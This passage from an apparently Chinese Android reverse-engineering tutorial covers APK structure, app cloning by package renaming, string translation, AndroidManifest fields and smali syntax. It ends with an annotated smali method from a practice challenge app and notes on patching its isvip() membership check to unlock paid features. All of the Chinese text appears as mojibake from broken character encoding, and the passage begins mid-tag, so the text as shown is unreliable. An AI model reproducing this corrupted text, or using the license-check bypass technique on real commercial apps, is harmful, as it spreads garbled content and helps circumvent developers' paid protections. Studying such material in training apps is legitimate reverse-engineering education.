title="Apkç»“æ„"></a>Apkç»“æ„</h4><table><thead><tr><th>æ–‡ä»¶</th><th>æ³¨é‡Š</th></tr></thead><tbody><tr><td>assetsç›®å½•</td><td>å­˜æ”¾APKé™æ€æ–‡ä»¶èµ„æºçš„åœ°æ–¹ï¼Œåƒè§†é¢‘ï¼ŒéŸ³é¢‘ï¼Œå›¾ç‰‡ç­‰</td></tr><tr><td>libç›®å½•</td><td>armeabi-v7aåŸºæœ¬é€šç”¨æ‰€æœ‰androidè®¾å¤‡ï¼Œ<br>arm64-v8aåªé€‚ç”¨äº64ä½çš„androidè®¾å¤‡ï¼Œ<br>x86å¸¸è§ç”¨äºandroidæ¨¡æ‹Ÿå™¨ï¼Œ<br>å…¶ç›®å½•ä¸‹çš„.soæ–‡ä»¶æ˜¯cæˆ–c++ç¼–è¯‘çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</td></tr><tr><td>META-INFç›®å½•</td><td>ä¿å­˜åº”ç”¨çš„ç­¾åä¿¡æ¯ï¼Œç­¾åä¿¡æ¯å¯ä»¥éªŒè¯APKæ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œç›¸å½“äºAPKçš„èº«ä»½è¯(éªŒè¯æ–‡ä»¶æ˜¯å¦åˆè¢«ä¿®æ”¹)</td></tr><tr><td>resç›®å½•</td><td>resç›®å½•å­˜æ”¾èµ„æºæ–‡ä»¶ï¼ŒåŒ…æ‹¬å›¾ç‰‡ï¼Œå­—ç¬¦ä¸²ç­‰ç­‰ï¼ŒAPKçš„è„¸è›‹ç”±ä»–çš„<font color="fish">layout</font>tæ–‡ä»¶è®¾è®¡</td></tr><tr><td>AndroidManifest.xmlæ–‡ä»¶</td><td>APKçš„åº”ç”¨æ¸…å•ä¿¡æ¯ï¼Œå®ƒæè¿°äº†åº”ç”¨çš„åå­—ï¼Œç‰ˆæœ¬ï¼Œæƒé™ï¼Œå¼•ç”¨çš„åº“æ–‡ä»¶ç­‰ç­‰ä¿¡æ¯</td></tr><tr><td>classes.dexæ–‡ä»¶</td><td>classes.dexæ˜¯javaæºç ç¼–è¯‘åç”Ÿæˆçš„javaå­—èŠ‚ç æ–‡ä»¶ï¼ŒAPKè¿è¡Œçš„ä¸»è¦é€»è¾‘</td></tr><tr><td>resources.arscæ–‡ä»¶</td><td>resources.arscæ˜¯ç¼–è¯‘åçš„äºŒè¿›åˆ¶èµ„æºæ–‡ä»¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ˜ å°„è¡¨ï¼Œæ˜ å°„ç€èµ„æºå’Œidï¼Œé€šè¿‡Ræ–‡ä»¶ä¸­çš„idå°±å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„èµ„æº</td></tr></tbody></table><hr><h4 id="åŒå¼€åŸç†"><a href="#åŒå¼€åŸç†" class="headerlink" title="åŒå¼€åŸç†"></a>åŒå¼€åŸç†</h4><p>è¿™é‡Œä¸»è¦æ¼”ç¤ºçš„æ˜¯æ”¹åŒ…åï¼Œå¦‚æœæœ‰ç­¾åæ ¡éªŒåŒå¼€ä¼šå¤±è´¥ï¼Œç¬¬äºŒä¸ªè½¯ä»¶ä¼šå‡ºç°é—ªé€€ç­‰æƒ…å†µ</p><table><thead><tr><th>åŸç†</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>ä¿®æ”¹åŒ…å</td><td>è®©æ‰‹æœºç³»ç»Ÿè®¤ä¸ºè¿™æ˜¯2ä¸ªAPPï¼Œè¿™æ ·çš„è¯å°±èƒ½ç”Ÿæˆ2ä¸ªæ•°æ®å­˜å‚¨è·¯å¾„ï¼Œæ­¤æ—¶çš„å¤šå¼€å°±ç­‰äºä½ æ‰“å¼€äº†ä¸¤ä¸ªäº’ä¸å¹²æ‰°çš„APP</td></tr><tr><td>ä¿®æ”¹Framework</td><td>å¯¹äºæœ‰ç³»ç»Ÿä¿®æ”¹æƒé™çš„å‚å•†ï¼Œå¯ä»¥ä¿®æ”¹Frameworkæ¥å®ç°åŒå¼€çš„ç›®çš„ï¼Œä¾‹å¦‚ï¼šå°ç±³è‡ªå¸¦å¤šå¼€</td></tr><tr><td>é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯å®ç°</td><td>è™šæ‹ŸFrameworkå±‚ã€è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€æ¨¡æ‹ŸAndroidå¯¹ç»„ä»¶çš„ç®¡ç†ã€è™šæ‹Ÿåº”ç”¨è¿›ç¨‹ç®¡ç† ç­‰ä¸€æ•´å¥—è™šæ‹ŸæŠ€æœ¯ï¼Œå°†APKå¤åˆ¶ä¸€ä»½åˆ°è™šæ‹Ÿç©ºé—´ä¸­è¿è¡Œï¼Œä¾‹å¦‚ï¼šå¹³è¡Œç©ºé—´</td></tr><tr><td>ä»¥æ’ä»¶æœºåˆ¶è¿è¡Œ</td><td>åˆ©ç”¨åå°„æ›¿æ¢ï¼ŒåŠ¨æ€ä»£{è¿‡}{æ»¤}ç†ï¼Œhookäº†ç³»ç»Ÿçš„å¤§éƒ¨åˆ†ä¸systemâ€”serverè¿›ç¨‹é€šè®¯çš„å‡½æ•°ï¼Œä»¥æ­¤ä½œä¸ºâ€œæ¬ºä¸Šç’ä¸‹â€çš„ç›®çš„ï¼Œæ¬ºéª—ç³»ç»Ÿâ€œä»¥ä¸ºâ€åªæœ‰ä¸€ä¸ªapkåœ¨è¿è¡Œï¼Œç’è¿‡æ’ä»¶è®©å…¶â€œè®¤ä¸ºâ€è‡ªå·±å·²ç»å®‰è£…ã€‚ä¾‹å¦‚ï¼šVirtualApp</td></tr></tbody></table><p>1.å®‰è£…ç¨‹åºä¹‹åç”¨npç®¡ç†å™¨è¿›è¡Œå®‰è£…åŒ…æå–</p><p>2.ç‚¹å‡»æå–å‡ºçš„å®‰è£…åŒ…åç‚¹å‡»â€åŠŸèƒ½â€œé€‰é¡¹</p><p>3.ç‚¹å‡»å®‰è£…åŒ…å…±å­˜ï¼Œæ›´æ”¹åŒ…å</p><hr><h4 id="Apkæ±‰åŒ–"><a href="#Apkæ±‰åŒ–" class="headerlink" title="Apkæ±‰åŒ–"></a>Apkæ±‰åŒ–</h4><p>æ±‰åŒ–ï¼šä½¿ç”¨ä¸“é—¨çš„å·¥å…·å¯¹å¤–æ–‡ç‰ˆçš„è½¯ä»¶èµ„æºè¿›è¡Œè¯»å–ã€ç¿»è¯‘ã€ä¿®æ”¹ã€å›å†™ç­‰ä¸€ç³»åˆ—å¤„ç†ï¼Œä½¿è½¯ä»¶çš„èœå•ã€å¯¹è¯æ¡†ã€æç¤ºç­‰ç”¨æˆ·ç•Œé¢æ˜¾ç¤ºä¸ºä¸­æ–‡ï¼Œè€Œç¨‹åºçš„å†…æ ¸å’ŒåŠŸèƒ½ä¿æŒä¸å˜ï¼Œè¿™ä¸ªè¿‡ç¨‹å³ä¸ºè½¯ä»¶æ±‰åŒ–</p><p><strong>åŸºæœ¬ä¸Šå­—ç¬¦ä¸²éƒ½æ˜¯åœ¨arscé‡Œï¼Œå»ºè®®ä¸€é”®æ±‰åŒ–ï¼Œç„¶åå†æ¶¦è‰²ã€‚</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/AndroidRe/HuanHuaLiuCheng.png" alt="HuanHuaLiuCheng"></p><p>é™¤äº†å›¾ä¸­çš„æ±‰åŒ–æ–¹å¼è¿˜æœ‰æ›´åŠ é‚ªé—¨çš„å°†å­—ç¬¦å†™è¿›.soæ–‡ä»¶ä¸­çš„</p><p>ï¼ˆä»¥ä¸‹æ–¹æ³•ä¸æ˜¯é€‚åˆç”¨åœ¨.soæ–‡ä»¶ä¸­ï¼‰</p><p>1.å¼€å‘å·¥å…·è¿›è¡Œå­—ç¬¦æå–</p><p>2.åœ¨å®‰è£…åŒ…ä¸­è¿›è¡Œé«˜çº§æœç´¢ï¼Œæœç´¢å­—ç¬¦æ‰€åœ¨æ–‡ä»¶ä½ç½®</p><p>3.å°†å­—ç¬¦è¿›è¡Œç¿»è¯‘æ›¿æ¢</p><p>4.é‡æ–°ç¼–è¯‘ç­¾åå®‰è£…</p><hr><h4 id="åˆè¯†AndroidManifest-xml"><a href="#åˆè¯†AndroidManifest-xml" class="headerlink" title="åˆè¯†AndroidManifest.xml"></a>åˆè¯†AndroidManifest.xml</h4><p>AndroidManifest.xmlæ–‡ä»¶æ˜¯æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ä¿¡æ¯æè¿°æ–‡ä»¶ï¼Œå®šä¹‰äº†åº”ç”¨ç¨‹åºä¸­åŒ…å«çš„Activity,Service,Content providerå’ŒBroadcastReceiverç»„ä»¶ä¿¡æ¯ã€‚æ¯ä¸ªåº”ç”¨ç¨‹åºåœ¨æ ¹ç›®å½•ä¸‹<font color="fish">å¿…é¡»åŒ…å«ä¸€ä¸ªAndroidManifest.xml</font>æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶åä¸èƒ½ä¿®æ”¹ã€‚å®ƒæè¿°äº†packageä¸­æš´éœ²çš„ç»„ä»¶ï¼Œä»–ä»¬å„è‡ªçš„å®ç°ç±»ï¼Œå„ç§èƒ½è¢«å¤„ç†çš„æ•°æ®å’Œå¯åŠ¨ä½ç½®ã€‚</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">versionCode</td><td align="left">ç‰ˆæœ¬å·ï¼Œä¸»è¦ç”¨æ¥æ›´æ–°ï¼Œä¾‹å¦‚:12</td></tr><tr><td align="left">versionName</td><td align="left">ç‰ˆæœ¬åï¼Œç»™ç”¨æˆ·çœ‹çš„ï¼Œä¾‹å¦‚:1.2</td></tr><tr><td align="left">package</td><td align="left">åŒ…åï¼Œä¾‹å¦‚ï¼šcom.zj.52pj.demo</td></tr><tr><td align="left">uses-permission android:name&#x3D;â€â€</td><td align="left">åº”ç”¨æƒé™ï¼Œä¾‹å¦‚ï¼šandroid.permission.INTERNET ä»£è¡¨ç½‘ç»œæƒé™</td></tr><tr><td align="left">android:label&#x3D;â€@string&#x2F;app_nameâ€</td><td align="left">åº”ç”¨åç§°</td></tr><tr><td align="left">android:icon&#x3D;â€@mipmap&#x2F;ic_launcherâ€</td><td align="left">åº”ç”¨å›¾æ ‡è·¯å¾„</td></tr><tr><td align="left">android:debuggable&#x3D;â€trueâ€</td><td align="left">åº”ç”¨æ˜¯å¦å¼€å¯debugæƒé™</td></tr></tbody></table><p>æƒ³è¦æ›´æ”¹ç¨‹åºå›¾æ ‡å’Œåå­—çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨npç®¡ç†å™¨çš„â€œé€šç”¨ç¼–è¾‘â€è¿›è¡Œæ›´æ”¹</p><hr><hr><h3 id="3-åˆè¯†smaliï¼Œvipç»ˆç»“è€…"><a href="#3-åˆè¯†smaliï¼Œvipç»ˆç»“è€…" class="headerlink" title="3.åˆè¯†smaliï¼Œvipç»ˆç»“è€…"></a>3.<strong>åˆè¯†smaliï¼Œvipç»ˆç»“è€…</strong></h3><h4 id="ä»€ä¹ˆæ˜¯JVMã€Dalvikã€ART"><a href="#ä»€ä¹ˆæ˜¯JVMã€Dalvikã€ART" class="headerlink" title="ä»€ä¹ˆæ˜¯JVMã€Dalvikã€ART"></a>ä»€ä¹ˆæ˜¯JVMã€Dalvikã€ART</h4><p>JVMæ˜¯JAVAè™šæ‹Ÿæœºï¼Œè¿è¡ŒJAVAå­—èŠ‚ç ç¨‹åº<br>Dalvikæ˜¯Googleä¸“é—¨ä¸ºAndroidè®¾è®¡çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼ŒDalvikæœ‰ä¸“å±çš„æ–‡ä»¶æ‰§è¡Œæ ¼å¼dex(Dalvik executable)<br>Art(Android Runtime)ç›¸å½“äºDalvikçš„å‡çº§ç‰ˆï¼Œæœ¬è´¨ä¸Dalvikæ— å¼‚</p><h4 id="smailåŠå…¶è¯­æ³•"><a href="#smailåŠå…¶è¯­æ³•" class="headerlink" title="smailåŠå…¶è¯­æ³•"></a>smailåŠå…¶è¯­æ³•</h4><p>smaliæ˜¯Dalvikçš„å¯„å­˜å™¨è¯­è¨€ï¼Œsmaliä»£ç æ˜¯dexåç¼–è¯‘è€Œæ¥çš„</p><h5 id="å…³é”®å­—ï¼š"><a href="#å…³é”®å­—ï¼š" class="headerlink" title="å…³é”®å­—ï¼š"></a>å…³é”®å­—ï¼š</h5><table><thead><tr><th align="left">åç§°</th><th align="left">æ³¨é‡Š</th></tr></thead><tbody><tr><td align="left">.class</td><td align="left">ç±»å</td></tr><tr><td align="left">.super</td><td align="left">çˆ¶ç±»åï¼Œç»§æ‰¿çš„ä¸Šçº§ç±»ååç§°</td></tr><tr><td align="left">.source</td><td align="left">æºå</td></tr><tr><td align="left">.field</td><td align="left">å˜é‡</td></tr><tr><td align="left">.method</td><td align="left">æ–¹æ³•å</td></tr><tr><td align="left">.register</td><td align="left">å¯„å­˜å™¨</td></tr><tr><td align="left">.end method</td><td align="left">æ–¹æ³•åçš„ç»“æŸ</td></tr><tr><td align="left">public</td><td align="left">å…¬æœ‰</td></tr><tr><td align="left">protected</td><td align="left">åŠå…¬å¼€ï¼Œåªæœ‰åŒä¸€å®¶äººæ‰èƒ½ç”¨</td></tr><tr><td align="left">private</td><td align="left">ç§æœ‰ï¼Œåªèƒ½è‡ªå·±ä½¿ç”¨</td></tr><tr><td align="left">.parameter</td><td align="left">æ–¹æ³•å‚æ•°</td></tr><tr><td align="left">.prologue</td><td align="left">æ–¹æ³•å¼€å§‹</td></tr><tr><td align="left">.line xxx</td><td align="left">ä½äºç¬¬xxxè¡Œ</td></tr></tbody></table><h5 id="æ•°æ®ç±»å‹å¯¹åº”"><a href="#æ•°æ®ç±»å‹å¯¹åº”" class="headerlink" title="æ•°æ®ç±»å‹å¯¹åº”"></a>æ•°æ®ç±»å‹å¯¹åº”</h5><table><thead><tr><th align="left">smaliç±»å‹</th><th align="left">javaç±»å‹</th><th align="left">æ³¨é‡Š</th></tr></thead><tbody><tr><td align="left">V</td><td align="left">void</td><td align="left">æ— è¿”å›å€¼</td></tr><tr><td align="left">Z</td><td align="left">boolean</td><td align="left">å¸ƒå°”å€¼ç±»å‹ï¼Œè¿”å›0æˆ–1</td></tr><tr><td align="left">B</td><td align="left">byte</td><td align="left">å­—èŠ‚ç±»å‹ï¼Œè¿”å›å­—èŠ‚</td></tr><tr><td align="left">S</td><td align="left">short</td><td align="left">çŸ­æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td align="left">C</td><td align="left">char</td><td align="left">å­—ç¬¦ç±»å‹ï¼Œè¿”å›å­—ç¬¦</td></tr><tr><td align="left">I</td><td align="left">int</td><td align="left">æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td align="left">J</td><td align="left">long ï¼ˆ64ä½ éœ€è¦2ä¸ªå¯„å­˜å™¨å­˜å‚¨ï¼‰</td><td align="left">é•¿æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td align="left">F</td><td align="left">float</td><td align="left">å•æµ®ç‚¹ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td align="left">D</td><td align="left">double ï¼ˆ64ä½ éœ€è¦2ä¸ªå¯„å­˜å™¨å­˜å‚¨ï¼‰</td><td align="left">åŒæµ®ç‚¹ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td align="left">string</td><td align="left">String</td><td align="left">æ–‡æœ¬ç±»å‹ï¼Œè¿”å›å­—ç¬¦ä¸²</td></tr><tr><td align="left">Lxxx&#x2F;xxx&#x2F;xxx</td><td align="left">object</td><td align="left">å¯¹è±¡ç±»å‹ï¼Œè¿”å›å¯¹è±¡</td></tr></tbody></table><h5 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h5><table><thead><tr><th align="left">å…³é”®å­—</th><th align="left">æ³¨é‡Š</th></tr></thead><tbody><tr><td align="left">const</td><td align="left">é‡å†™æ•´æ•°å±æ€§ï¼ŒçœŸå‡å±æ€§å†…å®¹ï¼Œåªèƒ½æ˜¯æ•°å­—ç±»å‹</td></tr><tr><td align="left">const-string</td><td align="left">é‡å†™å­—ç¬¦ä¸²å†…å®¹</td></tr><tr><td align="left">const-wide</td><td align="left">é‡å†™é•¿æ•´æ•°ç±»å‹ï¼Œå¤šç”¨äºä¿®æ”¹åˆ°æœŸæ—¶é—´ã€‚</td></tr><tr><td align="left">return</td><td align="left">è¿”å›æŒ‡ä»¤</td></tr><tr><td align="left">if-eq</td><td align="left">å…¨ç§°equal(a&#x3D;b)ï¼Œæ¯”è¾ƒå¯„å­˜å™¨abå†…å®¹ï¼Œç›¸åŒåˆ™è·³</td></tr><tr><td align="left">if-ne</td><td align="left">å…¨ç§°not equal(a!&#x3D;b)ï¼Œabå†…å®¹ä¸ç›¸åŒåˆ™è·³</td></tr><tr><td align="left">if-eqz</td><td align="left">å…¨ç§°equal zero(a&#x3D;0)ï¼Œzå³æ˜¯0çš„æ ‡è®°ï¼Œaç­‰äº0åˆ™è·³</td></tr><tr><td align="left">if-nez</td><td align="left">å…¨ç§°not equal zero(a!&#x3D;0)ï¼Œaä¸ç­‰äº0åˆ™è·³</td></tr><tr><td align="left">if-ge</td><td align="left">å…¨ç§°greater equal(a&gt;&#x3D;b)ï¼Œaå¤§äºæˆ–ç­‰äºåˆ™è·³</td></tr><tr><td align="left">if-le</td><td align="left">å…¨ç§°little equal(a&lt;&#x3D;b)ï¼Œaå°äºæˆ–ç­‰äºåˆ™è·³</td></tr><tr><td align="left">goto</td><td align="left">å¼ºåˆ¶è·³åˆ°æŒ‡å®šä½ç½®</td></tr><tr><td align="left">switch</td><td align="left">åˆ†æ”¯è·³è½¬ï¼Œä¸€èˆ¬ä¼šæœ‰å¤šä¸ªåˆ†æ”¯çº¿ï¼Œå¹¶æ ¹æ®æŒ‡ä»¤è·³è½¬åˆ°é€‚å½“ä½ç½®</td></tr><tr><td align="left">iget</td><td align="left">è·å–å¯„å­˜å™¨æ•°æ®</td></tr></tbody></table><p>å…¶ä½™æŒ‡ä»¤å¯ç”¨è¯­æ³•å·¥å…·æŸ¥è¯¢</p><p>å®šä½æ–¹æ³•ï¼šæœç´¢å¼¹çª—å…³é”®å­—ã€æŠ“å–æŒ‰é’®id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸€ä¸ªç§æœ‰ã€é™æ€ã€ä¸å¯å˜çš„æ–¹æ³•   æ–¹æ³•å</span></span><br><span class="line">.method <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> onCreate$lambda-<span class="number">2</span>(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z <span class="comment">//(è¿™é‡Œé¢æ˜¯æ–¹æ³•çš„å‚æ•°)è¿™é‡Œæ˜¯æ–¹æ³•è¿”å›å€¼ç±»å‹ï¼Œè¡¨ç¤ºå¸ƒå°”å€¼ç±»å‹ï¼Œè¿”å›å‡æˆ–çœŸ</span></span><br><span class="line">    .registers <span class="number">7</span>  <span class="comment">//å¯„å­˜å™¨æ•°é‡</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">33</span>  <span class="comment">//ä»£ç æ‰€åœ¨çš„è¡Œæ•°</span></span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  <span class="comment">//è¯»å–p0(ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå‚è€ƒå¯„å­˜å™¨çŸ¥è¯†)ä¸­elementçš„å€¼èµ‹å€¼ç»™p0</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> p5, <span class="number">0x1</span>  <span class="comment">//p5èµ‹å€¼1</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">16</span> v0, <span class="number">0xa</span> <span class="comment">//v0èµ‹å€¼10ï¼Œåœ¨16è¿›åˆ¶é‡Œaè¡¨ç¤º10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-ge p0, v0, :cond_15  <span class="comment">//åˆ¤æ–­p0çš„å€¼æ˜¯å¦å¤§äºæˆ–ç­‰äºv0çš„å€¼(å³p0çš„å€¼æ˜¯å¦å¤§äºæˆ–ç­‰äº10)ï¼Œå¦‚æœå¤§äºæˆ–ç­‰äºåˆ™è·³è½¬åˆ°:cond_15</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">34</span>  <span class="comment">//ä»¥ä¸‹æ˜¯å¸¸è§çš„Toastå¼¹çª—ä»£ç </span></span><br><span class="line">    check-cast p1, Landroid/content/Context; <span class="comment">//æ£€æŸ¥Contextå¯¹è±¡å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line">    const-string p0, <span class="string">&quot;è¯·å…ˆè·å–10ä¸ªç¡¬å¸å“¦&quot;</span> <span class="comment">//å¼¹çª—æ–‡æœ¬ä¿¡æ¯ï¼ŒæŠŠ&quot;&quot;é‡Œçš„å­—ç¬¦ä¸²æ•°æ®èµ‹å€¼ç»™p0</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence; <span class="comment">//æ£€æŸ¥CharSequenceå¯¹è±¡å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class="line">    <span class="comment">//å°†å¼¹çª—æ–‡æœ¬ã€æ˜¾ç¤ºæ—¶é—´ç­‰ä¿¡æ¯ä¼ ç»™p1</span></span><br><span class="line"></span><br><span class="line">    move-result-object p0  <span class="comment">//ç»“æœä¼ é€’ç»™p0</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  <span class="comment">//å½“çœ‹åˆ°è¿™ä¸ªToast;-&gt;showä½ å°±åº”è¯¥ååº”è¿‡æ¥è¿™é‡Œæ˜¯å¼¹çª—ä»£ç </span></span><br><span class="line"></span><br><span class="line">    goto :goto_31  <span class="comment">//è·³è½¬åˆ°:goto_31</span></span><br><span class="line"></span><br><span class="line">    :cond_15 <span class="comment">//è·³è½¬çš„ä¸€ä¸ªåœ°å€</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  <span class="comment">//åˆ¤æ–­isvipæ–¹æ³•çš„è¿”å›å€¼æ˜¯å¦ä¸ºçœŸ(å³ç»“æœæ˜¯å¦ä¸º1)</span></span><br><span class="line"></span><br><span class="line">    move-result p0  <span class="comment">//ç»“æœèµ‹å€¼ç»™p0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-eqz p0, :cond_43 <span class="comment">//å¦‚æœç»“æœä¸º0åˆ™è·³è½¬cond_43åœ°å€</span></span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d0018</span>  <span class="comment">//åœ¨arscä¸­çš„idç´¢å¼•ï¼Œè¿™ä¸ªå€¼å¯ä»¥è¿›è¡ŒæŸ¥è¯¢</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">37</span></span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V <span class="comment">//è®¾ç½®å›¾ç‰‡èµ„æº</span></span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d0008</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">38</span></span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d000a</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">40</span></span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> p2, <span class="number">0x2</span> <span class="comment">//p2èµ‹å€¼2</span></span><br><span class="line"></span><br><span class="line">    const-string p3, <span class="string">&quot;level&quot;</span> <span class="comment">//spçš„ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V <span class="comment">//å†™å…¥æ•°æ®</span></span><br><span class="line"></span><br><span class="line">    goto :goto_50 <span class="comment">//è·³è½¬åœ°å€</span></span><br><span class="line"></span><br><span class="line">    :cond_43</span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const-string p0, <span class="string">&quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot;</span> <span class="comment">//è¯·å…ˆå……å€¼å¤§ä¼šå‘˜å“¦ï¼</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    <span class="keyword">return</span> p5  <span class="comment">//è¿”å›p5çš„å€¼</span></span><br><span class="line">.end method <span class="comment">//æ–¹æ³•ç»“æŸ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­æ˜¯å¦æ˜¯å¤§ä¼šå‘˜çš„æ–¹æ³•</span></span><br><span class="line">.method <span class="keyword">public</span> <span class="keyword">final</span> <span class="title function_">isvip</span><span class="params">()</span>Z</span><br><span class="line">    .registers <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> v0, <span class="number">0x0</span> <span class="comment">//v0èµ‹å€¼0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0 <span class="comment">//è¿”å›v0çš„å€¼</span></span><br><span class="line"></span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ–¹æ³•ï¼šä¿®æ”¹åˆ¤æ–­ã€å¼ºåˆ¶è·³è½¬ã€ä¿®æ”¹å¯„å­˜å™¨çš„å€¼</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/AndroidRe/KeyPoint.png" alt="KeyPoint"></p><h4 id="å¯„å­˜å™¨-ä½ è¦æ˜¯ä¼šç”¨idaæˆ–è€…çœ‹è¿‡æ±‡ç¼–å°±å¾ˆå®¹æ˜“æ˜ç™½"><a href="#å¯„å­˜å™¨-ä½ è¦æ˜¯ä¼šç”¨idaæˆ–è€…çœ‹è¿‡æ±‡ç¼–å°±å¾ˆå®¹æ˜“æ˜ç™½" class="headerlink" 